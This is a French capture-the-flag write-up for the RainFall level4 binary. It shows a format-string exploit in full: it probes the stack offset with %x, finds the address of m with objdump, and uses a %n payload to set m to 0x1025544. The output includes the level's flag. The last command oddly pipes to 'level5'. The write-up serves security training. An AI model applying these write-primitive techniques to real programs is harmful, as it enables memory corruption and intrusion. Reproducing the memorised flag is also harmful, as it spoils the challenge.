# Analyse du code

Dans le code nous voyons qu'il y a une fonction n(), qui print le flag lorsque m = 0x1025544.
Nous ne pouvons pas interagir directement avec m, mais grace a printf qui manque de sanitazer, nous pouvons exploiter cette faille afin de changer la valeur de m

# Preparation du payload

- trouver le buffer utilser par printf

echo $(python -c "print('a'*4 + '.%x' * 12)") | ./level4 
aaaa.b7ff26b0.bffff794.b7fd0ff4.0.0.bffff758.804848d.bffff550.200.b7fd1ac0.b7ff37d0.61616161

- adresse de m
	level4@RainFall:~$ objdump -t ./level4  |grep m
	./level4:     file format elf32-i386
	[…]
	08 04 98 10 g     O .bss   00000004              m
	[…]
- payload
	$(python -c "print('\x10\x98\x04\x08' + '%16930112x%12\$n')") 

# Exploit
	echo $(python -c "print('\x10\x98\x04\x08' + '%16930112x%12\$n')") > /tmp/_
	cat /tmp/_ | level5
	0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a